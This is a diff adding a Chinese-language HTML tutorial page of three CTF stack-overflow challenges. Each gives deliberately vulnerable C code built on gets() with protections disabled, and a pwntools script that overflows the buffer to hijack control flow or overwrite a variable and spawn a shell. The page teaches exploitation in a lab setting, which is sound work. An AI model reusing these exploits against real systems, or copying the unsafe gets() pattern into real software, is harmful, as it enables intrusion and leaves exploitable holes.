@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF-Pwn 栈溢出实战</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .animate-fade-in {
+      animation: fadeIn 0.3s ease-out forwards;
+    }
+    code {
+      background: rgba(0,0,0,0.3);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    pre {
+      background: #1a1a1a;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-900 text-gray-200 p-6 font-mono selection:bg-blue-500/30">
+  <div class="max-w-6xl mx-auto space-y-6">
+    
+    <!-- Header -->
+    <div class="border-b border-gray-700 pb-4">
+      <div class="flex items-center justify-between">
+        <div>
+          <a href="ctf-index.html" class="text-blue-400 hover:text-blue-300 text-sm flex items-center gap-1 mb-2">
+            <i data-lucide="arrow-left" class="w-4 h-4"></i>
+            返回CTF实战首页
+          </a>
+          <h1 class="text-2xl font-bold text-white flex items-center gap-2">
+            <i data-lucide="layers" class="w-6 h-6 text-red-400"></i>
+            CTF-Pwn 栈溢出实战
+          </h1>
+          <p class="text-gray-400 mt-2">
+            3道题目，从入门到进阶，掌握栈溢出漏洞的利用。
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 1 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-red-900/50 rounded-lg flex items-center justify-center text-white font-bold">1</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge1 - 简单的gets溢出</h3>
+          <span class="text-xs text-red-400">入门</span>
+        </div>
+      </div>
+
+      <!-- Source Code -->
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2 flex items-center gap-2">
+          <i data-lucide="file-code" class="w-4 h-4"></i>
+          源码 (challenge1.c)
+        </h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void win() {
+    system("/bin/sh");  // 获取shell的函数
+}
+
+int main() {
+    char buf[32];  // 32字节的缓冲区
+    
+    printf("Welcome to Stack Overflow Challenge 1!\n");
+    printf("Can you overflow this buffer?\n");
+    
+    gets(buf);  // 危险！不检查输入长度
+    
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span><code>gets(buf)</code> 不限制输入长度</li>
+            <li><span class="text-green-400">利用方法：</span>溢出覆盖返回地址，跳转到 <code>win()</code> 函数</li>
+            <li><span class="text-blue-400">溢出量：</span>32字节 + 8字节(Saved RBP) = 40字节后开始覆盖返回地址</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- Compile -->
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2 flex items-center gap-2">
+          <i data-lucide="terminal" class="w-4 h-4"></i>
+          编译命令
+        </h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -z execstack -o challenge1 challenge1.c</code>
+          <div class="text-gray-400 text-xs mt-2">
+            -no-pie: 禁用地址随机化 | -fno-stack-protector: 禁用栈保护 | -z execstack: 栈可执行
+          </div>
+        </div>
+      </div>
+
+      <!-- Python Script -->
+      <div>
+        <h4 class="text-red-400 font-bold mb-2 flex items-center gap-2">
+          <i data-lucide="file-text" class="w-4 h-4"></i>
+          Python 解题脚本
+        </h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+# 启动进程
+p = process('./challenge1')
+
+# 构建溢出payload
+# 32字节填充 + 8字节覆盖Saved RBP + win函数地址
+padding = 32
+saved_rbp = 8
+win_addr = 0x401156  # win函数的地址，通过objdump或gdb获得
+
+payload = b'A' * (padding + saved_rbp)  # 填满缓冲区并覆盖到返回地址前
+payload += p64(win_addr)                 # 覆盖返回地址为win()
+
+# 发送payload
+p.sendline(payload)
+
+# 获取shell交互
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-gray-400">
+            <div class="text-yellow-400 font-bold mb-1">脚本解释</div>
+            <ul class="space-y-1">
+              <li><code>process('./challenge1')</code> - 本地启动程序进程</li>
+              <li><code>padding = 32</code> - 填满buf数组</li>
+              <li><code>saved_rbp = 8</code> - 覆盖Saved RBP需要的字节数</li>
+              <li><code>win_addr</code> - win函数的地址（需要根据实际编译结果确定）</li>
+              <li><code>p64(win_addr)</code> - 打包成64位地址（小端序）</li>
+              <li><code>sendline()</code> - 发送payload并换行</li>
+              <li><code>interactive()</code> - 切换到交互模式，获得shell控制</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 2 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-yellow-900/50 rounded-lg flex items-center justify-center text-white font-bold">2</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge2 - 64位栈溢出</h3>
+          <span class="text-xs text-yellow-400">入门</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2 flex items-center gap-2">
+          <i data-lucide="file-code" class="w-4 h-4"></i>
+          源码 (challenge2.c)
+        </h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void win() {
+    system("/bin/sh");
+}
+
+void vuln() {
+    char buf[16];  // 更小的缓冲区
+    gets(buf);
+    printf("You entered: %s\n", buf);
+}
+
+int main() {
+    printf("64-bit Stack Overflow Challenge!\n");
+    vuln();
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span><code>gets(buf)</code> 无限读取直到换行</li>
+            <li><span class="text-green-400">利用方法：</span>16字节buf + 8字节RBP = 24字节后覆盖返回地址</li>
+            <li><span class="text-blue-400">与challenge1区别：</span>缓冲区更小，地址可能不同</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2 flex items-center gap-2">
+          <i data-lucide="terminal" class="w-4 h-4"></i>
+          编译命令
+        </h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -z execstack -o challenge2 challenge2.c</code>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2 flex items-center gap-2">
+          <i data-lucide="file-text" class="w-4 h-4"></i>
+          Python 解题脚本
+        </h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+# 远程版本（如果部署在服务器上）
+# p = remote('ip', port)
+
+# 本地版本
+p = process('./challenge2')
+
+# 查找win函数地址（动态获取）
+elf = ELF('./challenge2')
+win_addr = elf.symbols['win']  # 自动获取win函数地址
+
+# 构建payload: 16(buf) + 8(Saved RBP) + win_addr
+payload = b'A' * 24
+payload += p64(win_addr)
+
+print(f"win address: {hex(win_addr)}")
+p.sendline(payload)
+
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-gray-400">
+            <div class="text-yellow-400 font-bold mb-1">脚本解释</div>
+            <ul class="space-y-1">
+              <li><code>elf = ELF('./challenge2')</code> - 加载二进制文件获取符号信息</li>
+              <li><code>elf.symbols['win']</code> - 自动获取win函数的真实地址</li>
+              <li><code>16 + 8 = 24</code> - 刚好覆盖到返回地址</li>
+              <li><code>hex(win_addr)</code> - 打印地址便于调试</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 3 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-green-900/50 rounded-lg flex items-center justify-center text-white font-bold">3</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge3 - 溢出到其他变量</h3>
+          <span class="text-xs text-green-400">进阶</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2 flex items-center gap-2">
+          <i data-lucide="file-code" class="w-4 h-4"></i>
+          源码 (challenge3.c)
+        </h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int authenticated = 0;  // 全局变量标记
+
+void win() {
+    system("/bin/sh");
+}
+
+void vuln() {
+    char password[32];
+    int secret = 0x1234;
+    
+    printf("Password: ");
+    gets(password);
+    
+    printf("Secret is: 0x%x\n", secret);
+    
+    if (secret == 0xbeef) {  // 溢出修改secret为此值即可
+        printf("Access granted!\n");
+        win();
+    } else {
+        printf("Access denied!\n");
+    }
+}
+
+int main() {
+    vuln();
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span>栈变量越界修改</li>
+            <li><span class="text-green-400">利用方法：</span>不需要覆盖返回地址，只需修改 <code>secret</code> 变量</li>
+            <li><span class="text-blue-400">溢出量：</span>32字节(password) + 4字节(secret) 覆盖即可</li>
+            <li><span class="text-purple-400">注意：</span>是小端序，0xbeef要写成 <code>\xef\xbe\x00\x00</code></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2 flex items-center gap-2">
+          <i data-lucide="terminal" class="w-4 h-4"></i>
+          编译命令
+        </h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -z execstack -o challenge3 challenge3.c</code>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2 flex items-center gap-2">
+          <i data-lucide="file-text" class="w-4 h-4"></i>
+          Python 解题脚本
+        </h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./challenge3')
+
+# payload结构: 32(password) + 4(secret低地址部分) = 36字节
+# 需要将secret修改为0xbeef
+
+payload = b'A' * 32          # 填满password数组
+payload += p32(0xbeef)       # 修改secret为0xbeef (小端序)
+
+p.sendline(payload)
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-gray-400">
+            <div class="text-yellow-400 font-bold mb-1">脚本解释</div>
+            <ul class="space-y-1">
+              <li><code>p32(0xbeef)</code> - 打包为32位小端序整数，得到 <code>b'\xef\xbe\x00\x00'</code></li>
+              <li><code>sendline()</code> - 发送后自动换行，触发 <code>gets()</code> 读取</li>
+              <li><strong>关键技巧：</strong>不是所有溢出都要改返回地址，改变量也能达到目的！</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Navigation -->
+    <div class="flex justify-between">
+      <a href="ctf-index.html" class="bg-gray-700 hover:bg-gray-600 text-white py-2 px-4 rounded font-bold transition-all">
+        ← 返回CTF实战首页
+      </a>
+      <a href="ctf-format-string.html" class="bg-yellow-700 hover:bg-yellow-600 text-white py-2 px-4 rounded font-bold transition-all">
+        格式化字符串实战 →
+      </a>
+    </div>
+
+  </div>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
